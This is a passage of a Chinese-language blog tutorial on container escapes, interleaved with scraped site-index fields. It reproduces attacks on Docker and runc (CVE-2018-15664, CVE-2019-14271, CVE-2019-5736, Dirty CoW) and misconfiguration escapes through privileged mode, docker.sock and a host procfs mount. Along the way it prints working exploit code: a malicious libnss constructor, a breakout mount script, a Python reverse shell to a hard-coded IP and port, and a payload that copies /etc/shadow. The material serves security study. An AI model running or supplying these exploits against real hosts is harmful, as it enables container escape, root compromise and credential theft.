守护进程接收到请求，会对用户给出的复制路径进行检查。如果路径中有容器内部的符号链接，则现在容器内部将其解析成对应的路径字符串，留待后用。 如果在 Docker 守护进程检查复制路径时，攻击者在这里先放置一个非符号链接的的常规文件或目录，检查结束后，攻击者在 Docker 守护进程使用路径前将其替换为一个符号链接，那么这个符号链接就会被打开时在宿主机上解析，从而导致目录穿越。 1.2.2 漏洞复现 利用 metarget 快速搭建 CVE-2018-15664 环境： ./metarget cnv install cve-2018-15664 下载并解压 PoC 其中， build 目录包含了用来编译 EXP 的 Dockerfile 和漏洞利用源代码 symlink_swap.c 注意 构建镜像时，在容器内安装 gcc 时报错，可以先在宿主机将 symlink_swap 编译好，再 COPY 到容器中。 修改后的 Dockerfile： # Build the binary.FROMopensuse/tumbleweed# RUN zypper in -y gcc glibc-devel-staticRUN mkdir /builddirCOPY symlink_swap.c /builddir/symlink_swap.c# RUN gcc -Wall -Werror -static -lpthread -o /builddir/symlink_swap /builddir/symlink_swap.cCOPY symlink_swap /builddir/symlink_swap# Set up our malicious rootfs.FROMopensuse/tumbleweedARG SYMSWAP_TARGET=/w00t_w00t_im_a_flagARG SYMSWAP_PATH=/totally_safe_pathRUN echo \"FAILED -- INSIDE CONTAINER PATH\" \u003e\"$SYMSWAP_TARGET\"COPY --from=0 /builddir/symlink_swap /symlink_swapENTRYPOINT [\"/symlink_swap\"] Dockerfile 的主要内容是构建漏洞利用程序，并将其放在容器的根目录下，并在根目录下创建一个 w00t_w00t_im_a_flag 文件，内容为：FAILED -- INSIDE CONTAINER PATH。容器启动后执行的程序(Entrypoint) 即为：symlink_swap。 Symlink_swap.c 内容： /* * Now create a symlink to \"/\" (which will resolve to the host's root if we * win the race) and a dummy directory at stash_path for us to swap with. * We use a directory to remove the possibility of ENOTDIR which reduces * the chance of us winning. */ if (symlink(\"/\", symlink_path) \u003c 0) bail(\"create symlink_path\"); if (mkdir(stash_path, 0755) \u003c 0) bail(\"mkdir stash_path\"); /* Now we do a RENAME_EXCHANGE forever. */ for (;;) { int err = rrenameat2(AT_FDCWD, symlink_path, AT_FDCWD, stash_path, RENAME_EXCHANGE); if (err \u003c 0) perror(\"symlink_swap: rename exchange failed\"); } return 0; } 在容器内创建指向根目录的符号链接，并不断地交换符号链接(由命令行参数传入，如「totaly_safe_path」)与一个正常的目录(如：「totaly_safe_path-stashed」)的名字。 run_read.sh : 实现读取宿主机文件内容的 shell 脚本 run_write.sh : 实现在宿主机写文件的 shell 脚本 以 run_write.sh 为例： SYMSWAP_PATH=/totally_safe_path SYMSWAP_TARGET=/w00t_w00t_im_a_flag # Create our flag. echo \"FAILED -- HOST FILE UNCHANGED\" | sudo tee \"$SYMSWAP_TARGET\" sudo chmod 0444 \"$SYMSWAP_TARGET\" # Run and build the malicious image. docker build -t cyphar/symlink_swap \\ --build-arg \"SYMSWAP_PATH=$SYMSWAP_PATH\" \\ --build-arg \"SYMSWAP_TARGET=$SYMSWAP_TARGET\" build/ ctr_id=$(docker run --rm -d cyphar/symlink_swap \"$SYMSWAP_PATH\") echo \"SUCCESS -- HOST FILE CHANGED\" | tee localpath # Now continually try to copy the files. while true do docker cp localpath \"${ctr_id}:$SYMSWAP_PATH/$SYMSWAP_TARGET\" done run_write.sh 启动后恶意容器运行，然后不断执行 docker cp 命令 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:1:2","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"1.3 CVE-2019-14271 影响 Docker 19.03.x before 19.03.1 1.3.1 原理 docker cp 命令依赖的 docker-tar 组件会加载容器内部的 nsswitch 动态链接库，攻击者可以通过劫持容器内部的 nsswitch 来实现代码的注入，获得宿主机上的 root 权限的代码执行能力。 用户在执行 docker cp 后，Docker 守护进程启动 docker-tar 进程来完成复制。以「从容器内文件复制到宿主机为例」，它会切换进程的根目录(执行 chroot)到容器根目录，将需要复制的文件打包，然后传递给 Docker 守护进程，Docker 守护进程负责将内容解析到用户指定的宿主机目标路径。 chroot 的操作主要是为了避免符号链接导致的路径穿越问题，但存在漏洞版本的 docker-tar 会加载必要的动态链接库，主要以 libness_ 开头的 nsswitch 动态链接库。chroot 切换根目录后，docker-tar 将加载容器内部的动态链接库。 漏洞利用过程如下： 找出 docker-tar 具体会加载哪些容器内的动态链接库。 下载对应的动态链接库源码，增加 __attribute__ 属性的函数 run_at_link(该函数在动态链接库被加载时首先执行) 等待 docker cp 触发漏洞 1.3.2 漏洞复现 1.3.2.1 确定目标 确定 docker cp 执行中用到哪些容器内的动态链接库。 在存在漏洞的 Docker 环境中，创建容器： docker run -itd --name=test ubuntu 寻找容器在宿主机上的绝对路径： docker exec -it test cat /proc/mounts | grep docker 返回结果包含： workdir=/var/lib/docker/overlay2/42549fa40947a72bc4f3ae8b8676297d774d4fe2f8afb7122717548b06861d85/work 容器在宿主机上的绝对路径即为：/var/lib/docker/overlay2/42549fa40947a72bc4f3ae8b8676297d774d4fe2f8afb7122717548b06861d85/merged 安装监控文件： apt install inotify-tools 监控文件夹： inotifywait -mr /var/lib/docker/overlay2/42549fa40947a72bc4f3ae8b8676297d774d4fe2f8afb7122717548b06861d85/merged/lib 执行 docker cp docker cp test:/etc/passwd ./ 可以看到加载了 libnss_files-2.31.so 1.3.2.2 构建动态链接库 libnss_*.so 均在 Glibc 中，首先下载 Glibc 库到本地。 首先要注释掉 gccwarn-c = -Wstrict-prototypes -Wold-style-definition，避免加入 payload 后编译失败。 在 ./nss/nss_files 目录下任意源码文件中添加 payload。以 files-service.c 为例。 // content should be added into nss/nss_files/files-service.c #include \u003csys/types.h\u003e#include \u003cunistd.h\u003e#include \u003cstdio.h\u003e#include \u003csys/wait.h\u003e # 容器内部原始 libnss_files.so.2 文件备份位置 #define ORIGINAL_LIBNSS \"/original_libnss_files.so.2\" # 恶意 libnss_files.so.2 文件位置 #define LIBNSS_PATH \"/lib/x86_64-linux-gnu/libnss_files.so.2\" bool is_priviliged(); __attribute__ ((constructor)) void run_at_link(void) { char * argv_break[2]; // 判断是否容器外是高权限执行，即 docker-tar if (!is_priviliged()) return; // 攻击执行一次即可，用原始的替换备份的库文件 // 避免后续对环境产生影响 rename(ORIGINAL_LIBNSS, LIBNSS_PATH); // 以 docker-tar 运行 /breakout 恶意脚本 if (!fork()) { // Child runs breakout argv_break[0] = strdup(\"/breakout\"); argv_break[1] = NULL; execve(\"/breakout\", argv_break, NULL); } else wait(NULL); // Wait for child return; } bool is_priviliged() { FILE * proc_file = fopen(\"/proc/self/exe\", \"r\"); if (proc_file != NULL) { fclose(proc_file); return false; // can open so /proc exists, not privileged } return true; // we're running in the context of docker-tar } 编译： # 目录结构： - gnu - glibc-2.27 - glibc-build # 安装 bison apt install bison # 新建 glibc-build 目录 mkdir glibc-build # 要到上级目录进行 config，不然会报错 ./glibc-2.27/glibc-build/configure --prefix=/usr/ # 编译 ~/glibc-2.27/glibc-build make 1.3.2.3 逃逸 breakout 文件： 将 procfs 伪文件系统挂载到容器内，将 PID 为 1 的根目录 /proc/1/root 绑定挂载到容器内部即可。 #!/bin/bash umount /host_fs \u0026\u0026 rm -rf /host_fs mkdir /host_fs mount -t proc none /proc # mount the host's procfs over /proc cd /proc/1/root # chdir to host's root mount --bind . /host_fs # mount host root at /host_fs 首先创建 victim 容器： docker run -itd --name=victim ubuntu 将 breakout 脚本放到 victim 容器根目录。 docker cp ./breakout victim:/breakout 进入容器，再将 /lib/x86_64-linux-gnu 下的 libnss_files.so.2 符号链接指向库文件移动到容器根目录下并重命名为 original_libnss_files.so.2，可以使用以下命令查看： readlink /lib/x86_64-linux-gnu/libnss_files.so.2 mv /lib/x86_64-linux-gnu/libnss_files.so.2 /original_libnss_files.so.2 最后将构建好的恶意 libnss_files.so 重命名为 libnss_files.so.2，放到容器内 /lib/x86_64-linux-gnu 下。 模拟用户执行 docker cp 操作： docker cp victim:/etc/passwd ./ 执行后，漏洞被触发，容器内部已经能看到挂载的 /host_fs，其中的 /etc/hostname 显示的即为宿主机的 hostname。 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:1:3","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"2 针对容器软件供应链的攻击案例 从用户角度来看，容器镜像在获取途径上，我们将其分为“从公共仓库获取”以及“从私有仓库获取”两种，那么对于从公共仓库获取的镜像，最重要的两个脆弱性问题：一方面是镜像中软件的安全漏洞问题；另一方面是镜像内的挖矿程序、后门程序、病毒、木马等恶意程序。 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:0","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"2.1 镜像漏洞利用 镜像漏洞利用指的是镜像本身存在漏洞时，使用镜像创建并运行的容器也通常会存在 相同漏洞，攻击者利用镜像中存在的漏洞去攻击容器，往往具有事半功倍的效果。 例如，Alpine 是一个轻量化的 Linux 发行版，基于 musl libc 和 busybox 构建而成。由 于其体积较小，因此以 Alpine 为基础镜像构建软件是非常流行的。但 Alpine 镜像曾曝出一个漏洞：CVE-2019-5021。在 3.3 ~ 3.9 版本的 Alpine 镜像中，root 用户密码被设置为空，攻击者可能在攻入容器后借此提升到容器内部 root 权限。 官方对此的回应是，Alpine 镜像使用 busybox 作为核心工具链，通过 /etc/security 限制了可以登入 root 用户的 tty 设备。除非是用户主动安装 shadow 和 linux-pam 来代替默认工具链，否则这个漏洞并不好利用。 但是，安全防护注重全面性，具有明显的短板效应。假如用户真的出于某种需求替换了默认工具链呢？那么进入容器的攻击者借助此漏洞就能直接获得容器内部 root 权限了。 FORM alpine:3.5RUN apk add --no-cache shadowRUN adduser -S non_rootUSERnon_root ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:1","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"2.2 镜像投毒 镜像投毒是一个宽泛的话题。它指的是攻击者通过某些方式，如上传恶意镜像到公开 仓库、入侵系统后上传镜像到受害者本地仓库，以及修改镜像名称并假冒正常镜像等，欺骗、诱导受害者使用攻击者指定的恶意镜像创建并运行容器，从而实现入侵或利用受害者的主机进行恶意活动的行为。 根据目的不同，常见的镜像投毒有三种类型：投放恶意挖矿镜像、投放恶意后门镜像和投放恶意 exploit 镜像 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:2","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"3 针对容器运行时的攻击 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:0","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"3.1 不安全配置导致的容器逃逸 Docker 已经将容器运行时的 Capabilities 黑名单机制改为如今的默认禁止所有 Capabilities，再以白名单方式赋予容器运行所需的最小权限。截止本文成稿时，Docker 默认赋予容器近 40 项权限中的 14 项： func DefaultCapabilities() []string { return []string{ \"CAP_CHOWN\", \"CAP_DAC_OVERRIDE\", \"CAP_FSETID\", \"CAP_FOWNER\", \"CAP_MKNOD\", \"CAP_NET_RAW\", \"CAP_SETGID\", \"CAP_SETUID\", \"CAP_SETFCAP\", \"CAP_SETPCAP\", \"CAP_NET_BIND_SERVICE\", \"CAP_SYS_CHROOT\", \"CAP_KILL\", \"CAP_AUDIT_WRITE\", } } 无论是细粒度权限控制还是其他安全机制，用户都可以通过修改容器环境配置或在运行容器时指定参数来缩小或扩大约束。如果用户为不完全受控的容器提供了某些危险的配置参数，就为攻击者提供了一定程度的逃逸可能性。 3.1.1 privileged 特权模式运行容器 当操作者执行 docker run --privileged 时，Docker 将允许容器访问宿主机上的所有设备，同时修改 AppArmor 或 SELinux 的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。 以特权模式和非特权模式创建了两个容器，其中特权容器内部可以看到宿主机上的设备： 攻击者可以直接在容器内部挂载宿主机磁盘，然后将根目录切换过去： mkdir host mount /dev/sda /host ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:1","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"3.2 危险挂载导致的容器逃逸 为了方便宿主机与虚拟机进行数据交换，虚拟化解决方案都会提供挂载宿主机目录到虚拟机的功能。容器同样如此。然而，将宿主机上的敏感文件或目录挂载到容器内部 - 当受控容器存在不安全的挂载时，会造成严重的问题。 3.2.1 挂载 Docker Socket 的情况 Docker Socket 是 Docker 守护进程监听的 Unix 域套接字，用来与守护进程通信 - 查询信息或下发命令。如果在攻击者可控的容器内挂载了该套接字文件（/var/run/docker.sock），容器逃逸就相当容易了，除非有进一步的权限限制。 复现过程： 首先创建一个容器并挂载 /var/run/docker.sock； 在该容器内安装 Docker 命令行客户端； 接着使用该客户端通过 Docker Socket 与 Docker 守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部； 在新容器内执行 chroot 将根目录切换到挂载的宿主机根目录。 docker run -itd --name demo -v /var/run/docker.sock:/var/run/docker.sock ubuntu 利用 CDK 进行进行检查： ./cdk run docker-sock-check /var/run/docker.sock 命令执行（逃逸）： ./cdk run docker-sock-pwn \u003csock_path\u003e \u003cshell_cmd\u003e ./cdk run docker-sock-pwn /var/run/docker.sock \"touch /host/tmp/pwn-success\" 3.2.2 挂载主机 procfs 的情况 procfs 是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的 procfs 挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用 root 权限，且没有开启 User Namespace 时。 一般来说，我们不会将宿主机的procfs挂载到容器中。然而，有些业务为了实现某些特殊需要，还是会将该文件系统挂载进来。 procfs 中的 /proc/sys/kernel/core_pattern 负责配置进程崩溃时内存转储数据的导出方式。从手册中能获得关于内存转储的详细信息，关键信息如下： 从 2.6.19 内核版本开始，Linux 支持在/proc/sys/kernel/core_pattern中使用新语法。如果该文件中的首个字符是管道符|，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。 因此，可以利用上述机制，在挂载了宿主机 procfs 的容器内实现逃逸。 环境搭建： ./metarget gadget install docker --version 18.03.1 ./metarget gadget install k8s --version 1.16.5 --domestic ./metarget cnv install mount-host-procfs 执行完成后，K8s 集群内 metarget 命令空间下将会创建一个名为 mount-host-procfs 的 pod。 宿主机的 procfs 在容器内部的挂载路径是 /host-proc。 复现： 执行以下命令进入容器： kubectl exec -it -n metarget mount-host-procfs /bin/bash 在容器中，首先拿到当前容器在宿主机上的绝对路径： cat /proc/mounts | grep docker 从 workdir 可以得到基础路径，结合背景知识可知当前容器在宿主机上的 merged 目录绝对路径如下： 向容器内 /host-proc/sys/kernel/core_pattern 内写入以下内容： echo -e \"|/var/lib/docker/overlay2/c7c07b405792a4da3db07f22ae42a35ad00c8946362f0ebe7687bea79785add8/merged/tmp/.x.py \\rcore \" \u003e /host-proc/sys/kernel/core_pattern 然后在容器内创建一个反弹 shell 的 /tmp/.x.py： cat \u003e/tmp/.x.py \u003c\u003c EOF #!/usr/bin/python import os import pty import socket lhost = \"101.32.10.105\" lport = 9999 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(\"HISTFILE\", '/dev/null') pty.spawn(\"/bin/bash\") os.remove('/tmp/.x.py') s.close() if __name__ == \"__main__\": main() EOF chmod +x /tmp/.x.py 最后，在容器内运行一个可以崩溃的程序即可，例如： #include \u003cstdio.h\u003eint main(void) { int *a = NULL; *a = 1; return 0; } 容器内若没有编译器，可以先在其他机器上编译好后放入容器中。 完成后，在其他机器上开启 shell 监听： ncat -lvnp 9999 接着在容器内执行上述编译好的崩溃程序，即可获得反弹 shell。 利用 CDK 工具： ./cdk run mount-procfs /mnt/host_proc \"touch /tmp/exp-success\" ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:2","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"4 相关程序漏洞导致的容器逃逸 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:4:0","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"4.1 CVE-2019-5736 影响版本：Docker version \u003c= 18.09.2 \u0026 RunC version \u003c= 1.0-rc6 4.1.1 原理 CVE-2019-5736 一个能够覆盖宿主机 runc 程序的容器逃逸漏洞。 在执行功能类似于 docker exec 等命令时，底层实际上是容器运行时在操作。例如 runC，相应地，runc exec 命令会被执行。它的最终效果是在容器内部执行用户指定的程序。进一步讲，就是在容器的各种命名空间内，受到各种限制（如 Cgroups）的情况下，启动一个进程。除此以外，这个操作与在宿主机上执行一个程序并无二致。 执行过程大体如下：runC 启动并加入到容器的命名空间，接着以自身 (/proc/self/ exe）为范本启动一个子进程，最后通过 exec 系统调用执行用户指定的二进制程序。 proc 伪文件系统，即 /proc。关于这个概念，这里我们主要关注 proc 下的两类文件： /proc/[PID]/exe：它是一种特殊的符号链接，又被称为 magic links， 指向进程自身 对应的本地程序文件（例如我们执行 ls /proc/[ls-PID]/exe 就指向 /bin/ls)。 /proc/[PID]/fd/：这个目录下包含了进程打开的所有文件描述符。 /proc/[PID]/exe 的特殊之处在于，当打开这个文件时，在权限检查通过的情况下，内核将 直接返回一个指向该文件的描述符，而非按照传统的打开方式做路径解析和文件查找。这样 一来，它实际上绕过了 mnt 命名空间及 chroot 机制对一个进程能够访问到的文件路径的限制。 那么，设想如下攻击场景：在 runc exec 加入到容器的命名空间之后，容器内进程已经能够 通过内部 /proc 观察到它，此时如果打开 /proc/runc-[PID]/exe 并写入一些内容，就能够实现 将宿主机上的 runc 二进制程序覆盖掉。这样一来，下一次用户调用 runc 来执行命令时，实 际执行的将是攻击者放置的指令。 在存在漏洞的容器环境内，上述思路是可行的，但是攻击者想要在容器内实现宿主机 上的代码执行（逃逸)，还需要突破两个限制： 用户权限限制，需要具有容器内部 root 权限。 Linux 不允许修改正在运行的进程对应的本地二进制文件。 事实上，很多容器就是以 root 身份启动服务的。 攻击步骤： 将容器内的 /bin/sh 程序覆盖为 #!/proc/self/exe。 持续遍历容器内 /proc 目录，读取每一个/proc/[PID]/cmdline，对 runc 做字符串 匹配，直到找到 runc 进程号。 以只读方式打开 /proc/[runc-PID]/exe，拿到文件描述符 fd。 持续尝试以写方式打开第 3 步中获得的只读 fd (/proc/self/fd/[fd])，一开始总是返回失败，直到 runc 结束占用后写方式打开成功，立即通过该 fd 向宿主机上的 /usr/bin/runc，(名字也可能是 /usr/bin/docker/runc）写入攻击载荷 runc 最后将执行用户通过 docker exec 指定的 /bin/sh，它的内容在第 1 步中已经被替换成 #/proc/self/exe，因此实际上将执行宿主机上的 runc，而 runc 也已经在第 4 步中被覆盖掉了。 4.1.2 复现 ./metarget cnv install cve-2019-5736 POC： payload 的内容： var payload = \"#!/bin/bash \\n cat /etc/shadow \u003e /tmp/shadow \u0026\u0026 chmod 777 /tmp/shadow\" ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:4:1","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"5 内核漏洞导致的容器逃逸 Linux 内核漏洞的危害之大、影响范围之广，使得它在各种攻防话题下都占据非常重要的一席。无论攻防场景怎样变化，我们对内核漏洞的利用往往都是从用户空间非法进入内核空间开始，到内核空间赋予当前或其他进程高权限后回到用户空间结束。 从操作系统层面来看，容器进程只是一种受到各种安全机制约束的进程，因此从攻防两端来看，容器逃逸都遵循传统的权限提升流程。攻击者可以凭借此特点拓展容器逃逸的思路，一旦有新的内核漏洞产生，就可以考虑它是否能够用于容器逃逸；而防守者则能够针对此特征进行防护和检测，如宿主机内核打补丁，或检查该内核漏洞利用有什么特点。 我们的关注点并非是内核漏洞，列举并剖析过多内核漏洞无益，但我们可以提出如下问题：为何内核漏洞能够用于容器逃逸，在具体实施过程中与内核漏洞用于传统权限提升有什么不同，在有了内核漏洞利用代码之后还需要做哪些工作才能实现容器逃逸。 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:5:0","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"5.1 CVE-2016-5195 近年来，Linux 系统曝出过无数内核漏洞，其中能够用来提权的也不少，脏牛依赖于内存页的写时复制机制，该机制英文名称为 Copy-on-Write，再结合内存页特性，将漏洞命名为Dirty CoW，译为脏牛）大概是其中最有名气的漏洞之一。漏洞发现者甚至为其申请了专属域名（dirtycow.ninja），在笔者的印象中，上一个同样申请了域名的严重漏洞还是2014年的心脏滴血（CVE-2014-0160，heartbleed.com）。自这两个漏洞开始，越来越多的研究人员开始为他们发现的高危漏洞申请域名（尽管依然是极少数）。 关于脏牛漏洞的分析和利用文章早已遍布全网。这里我们使用来自 scumjr 的 PoC 来完成容器逃逸。该利用的核心思路是向 vDSO 内写入 shellcode 并劫持正常函数的调用过程。 复现： ./metarget cnv install cve-2016-5195 git clone https://github.com/gebl/dirtycow-docker-vdso.git cd dirtycow-docker-vdso/ docker-compose run dirtycow /bin/bash 进入容器，编译 POC： cd /dirtycow-vdso/ make ./0xdeadbeef 192.168.172.136:1234 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:5:1","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"参考 云原生安全——攻防实践与体系构建 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:6:0","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"Docker 核心技术","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"Docker 核心技术 ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:0:0","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"1 背景 Docker 是一个开源的应用容器引擎，基于 Go 语言开发。Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口，更重要的是容器性能开销极低。 基于 Linux 内核的 Cgroup，Namespace，以及 Union FS 等技术，对进程进行封装隔离，属于操作系统 层面的虚拟化技术，由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。 最初实现是基于 LXC，从 0.7 以后开始去除 LXC，转而使用自行开发的 Libcontainer，从 1.11 开始，则 进一步演进为使用 runC 和 Containerd。 Docker 在容器的基础上，进行了进一步的封装，从文件系统、网络互联到进程隔离等等，极大的简化了容器的创建和维护，使得 Docker 技术比虚拟机技术更为轻便、快捷。 ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:1:0","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"1.1 Docker 与虚拟机的区别 Docker 有着比虚拟机更少的抽象层。由于 docker 不需要 Hypervisor 实现硬件资源虚拟化，运行在 docker 容器上的程序直接使用的都是实际物理机的硬件资源。因此在 CPU、内存利用率上 docker 将会在效率上有优势。 Docker 利用的是宿主机的内核，而不需要 Guest OS。因此，当新建一个容器时，docker 不需要和虚拟机一样重新加载一个操作系统内核。引导、加载操作系统内核是一个比较费时费资源的过程，当新建一个虚拟机时，虚拟机软件需要加载 Guest OS，这个新建过程是分钟级别的。而 docker 由于直接利用宿主机的操作系统，则省略了这个过程，因此新建一个 docker 容器只需要几秒钟。另外，现代操作系统是复杂的系统，在一台物理机上新增加一个操作系统的资源开销是比较大的，因此，docker 对比虚拟机在资源消耗上也占有比较大的优势。事实上，在一台物理机上我们可以很容易建立成百上千的容器，而只能建立几个虚拟机。 性能对比 容器主要特性 ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:1:1","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"1.2 容器操作 启动：docker run -it 交互 -d 后台运行 -p 端口映射 -v 磁盘挂载 启动已终止容器 docker start 停止容器 docker stop 查看容器进程 docker ps 查看容器细节 docker inspect [containerid] 进入容器 docker attach PID=$(docker inspect --format \"{{ .State.Pid }}\" [container]) nsenter --target $PID --mount --uts --ipc --net --pid ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:1:2","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"1.3 Dockerfile cat Dockerfile FROMubuntuENV MY_SERVICE_PORT=80 ADD bin/amd64/httpserver /httpserver ENTRYPOINT /httpserver 将 Dockerfile 打包成镜像 docker build -t cncamp/httpserver:${tag} . docker push geekby/httpserver:v1.0 运行容器 docker run -d geekby/httpserver:v1.0 ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:1:3","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"1.4 Docker 引擎架构 ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:1:4","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"2 Namespcce ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:2:0","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"2.1 背景 Linux Namespace 是一种 Linux Kernel 提供的资源隔离方案。 系统可以为进程分配不同的 Namespace 并保证不同的 Namespace 资源独立分配、进程彼此隔离，即不同的 Namespace 下的进程互不干扰 Linux 内核代码中 Namespace 的实现如下： ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:2:1","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"2.2 类别 2.2.1 进程编号 - PID 当启动了多个container，然后在每个 container 内部用 ps 命令看一下，会发现它们都有一个 PID 为 1 的进程。不同用户的进程就是通过 PID namespace 隔离开的，且不同的 namespace 中可以有相同的 PID。有了 PID namespace，每个 namespace 中的 PID 能够相互隔离。 2.2.2 网络设备 - Network 在每个 network space 内部，可以有独立的网络设备（虚拟的或者真实的）、IP 地址、路由表和防火墙规则等。其中的应用所 bind 的端口也是 per-namespace 的，比如 http 默认使用的是 80 端口，使用 network space 后，同一 host 上的各个 container 内部就都可以运行各自的 web server。 Docker 默认采用 veth 的方式将 container 中的虚拟网卡同 host 上的一个 docker bridge: docker0 连接在一起。 2.2.3 进程间通信 - IPC 利用这个 space，进程间的通信（Inter Process Communication）就被限定在了同一个 space 内部，即一个 container 中的某个进程只能和同一 container 中的其他进程通信。 container 的进程间交互实际上还是 host 上具有相同 Pid namespace 中的进程间交互，因此需要在 IPC 资源申请时加入 namespace 信息 - 每个 IPC 